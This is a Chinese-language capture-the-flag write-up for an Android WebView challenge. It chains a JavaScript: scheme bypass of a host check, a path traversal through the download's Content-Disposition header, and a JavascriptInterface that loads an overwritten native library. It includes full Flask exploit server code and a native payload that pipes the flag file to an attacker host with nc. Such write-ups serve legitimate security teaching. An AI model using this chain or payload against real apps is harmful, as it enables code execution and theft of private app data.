# WM Baby Droid

## 题目简述

题目给出运行在 Android 30 AVD 中的易受攻击客户端 `app-debug.apk`。远端服务会先校验 PoW，接收一个 `http://...` 形式的 POC URL，随后启动模拟器、安装目标 APK、通过 root broadcast 把真实 flag 写入 `com.wmctf.wmbabydroid` 的内部存储，再用该 URL 作为 intent data 启动 `MainActivity`。目标是在短时间窗口内利用 App 的 WebView/下载/native-lib 逻辑，把 `/data/data/com.wmctf.wmbabydroid/files/flag` 回传到攻击者服务器。

## 解题过程

### 绕过域名主机校验

可以看到如下校验逻辑：

```Java
if (!uri.getHost().endsWith(".google.com")) {
    finish();
    return;
}
```

它要求 URL 的域名主机必须以 `.google.com` 结尾。但这并不意味着你真的需要拥有一个 google 的子域名。因为对 URL 的 scheme 没有任何校验，所以可以通过 scheme 绕过。

POC

```Plain
JavaScript://www.google.com/%0d%0awindow.location.href='http://xx.xx.xx.xx/'
```

### Webview 下载时的路径遍历

漏洞代码如下：

```Java
webView.setDownloadListener(new DownloadListener() {
    @Override
    public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimeType, long contentLength) {
        String fileName = parseContentDisposition(contentDisposition);
        String destPath = new File(getExternalCacheDir(), fileName).getPath();
        new DownloadTask().execute(url, destPath);
    }
});
```

下载文件保存路径直接由 `getExternalCacheDir()` 和 `fileName` 拼接而成。`parseContentDisposition` 函数会返回 HTTP 头 `"Content-Disposition"` 中显示的文件名。

```Java
private static final Pattern CONTENT_DISPOSITION_PATTERN =
        Pattern.compile("attachment;\\s*filename\\s*=\\s*(\"?)([^\"]*)\\1\\s*$",
                Pattern.CASE_INSENSITIVE);

static String parseContentDisposition(String contentDisposition) {
    try {
        Matcher m = CONTENT_DISPOSITION_PATTERN.matcher(contentDisposition);
        if (m.find()) {
            return m.group(2);
        }
    } catch (IllegalStateException ex) {
        // This function is defined as returning null when it can't parse the header
    }
    return null;
}
```

所以在这种情况下，我们可以将 `Content-Disposition` 的值伪造成包含大量 `../`。最终路径应类似于：

```Plain
/sdcard/Android/data/com.wmctf.wmbabydroid/cache/../../../../../../../../../../../../data/data/com.wmctf.wmbabydroid/files/lmao.so
```

我们可以通过 python-flask 达成这一目标。

```Python
@app.route("/download", methods=['GET'])
def download():
    response = make_response(send_from_directory(os.getcwd(), 'exp.so', as_attachment=True))
    response.headers["Content-Disposition"] = "attachment; filename={}".format("../"*15+"data/data/com.wmctf.wmbabydroid/files/lmao.so")
    return response
```

### 覆写并触发 native-lib

有一个叫 `lmao` 的 **JavascriptInterface**。如果文件 `/data/data/com.wmctf.wmbabydroid/files/lmao.so` 存在，它会加载该本地可执行文件。

```Java
webView.addJavascriptInterface(this, "lmao");

@SuppressLint("JavascriptInterface")
@JavascriptInterface
public void lmao(){
    try {
        File so = new File(getFilesDir() + "/lmao.so");
        if(so.exists()){
            System.load(so.getPath());
        }
    } catch (Exception e){
        e.printStackTrace();
    }
}
```

我们需要延迟 2 秒来触发 `System.load`，这样才能成功覆写文件。

```Python
<h1>poc1</h1>
<script>
    function sleep(time) {
        return new Promise((resolve) => setTimeout(resolve, time));
    }
    sleep(2000).then(() => {
        window.lmao.lmao();
    })
    location.href = "/download"
</script>
```

### 最终 EXP

server.py

```python
import os
from flask import Flask, abort, Response, request, make_response, send_from_directory
import logging
import requests
from hashlib import md5
from gevent import pywsgi
import base64
import traceback
import json
app = Flask(__name__)

@app.route("/download", methods=['GET'])
def download():
    response = make_response(send_from_directory(os.getcwd(), 'exp.so', as_attachment=True))
    response.headers["Content-Disposition"] = "attachment; filename={}".format("../"*15+"data/data/com.wmctf.wmbabydroid/files/lmao.so")
    return response

@app.route('/', methods=['GET'])
def index():
    return """\
<h1>poc1</h1>
<script>
    function sleep(time) {
        return new Promise((resolve) => setTimeout(resolve, time));
    }
    sleep(2000).then(() => {
        window.lmao.lmao();
    })
    location.href = "/download"
</script>
"""

# @app.route('/log', methods=['GET'])
# def log():
#     print(request.args)
#     print(request.headers)

if __name__ == "__main__":
    print("http://127.0.0.1/")
    server = pywsgi.WSGIServer(('0.0.0.0', 80), app)
    server.serve_forever()

# adb shell su root am broadcast -a com.wuhengctf.SET_FLAG -n com.wuhengctf.wuhengdroid5/.FlagReceiver -e flag 'flag{t12312312312}'
# adb shell am start -n com.wmctf.wmbabydroid/com.wmctf.wmbabydroid.MainActivity -d "JavaScript://www.google.com/%0d%0awindow.location.href='http://xx.xx.xx.xx/'"
```

exp.so

```C++
#include <jni.h>
#include <stdlib.h>
#include <string.h>

JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    system("cat /data/data/com.wmctf.wmbabydroid/files/flag | nc xx.xx.xx.xx 233");
    return JNI_VERSION_1_6;
}
```

## 方法总结

- 核心技巧：把 WebView URL scheme 绕过、下载路径遍历和 `JavascriptInterface` 触发 native library 串成一条链。
- 识别信号：Android 题目允许提交 URL/安装辅助 APK，目标 App 又有 WebView、下载回调、`addJavascriptInterface`、`System.load` 时，应检查 URL scheme 校验、下载文件名拼接和内部存储可写路径。
- 复用要点：远端服务把 flag 写入 App 私有目录后再启动 Activity，因此利用链必须在 App 自身权限内读文件；通过 `Content-Disposition` 控制文件名时要确认路径拼接点和最终落点，再用 JS 延迟触发加载，避免 `lmao.so` 尚未覆盖完成就调用 `System.load`。
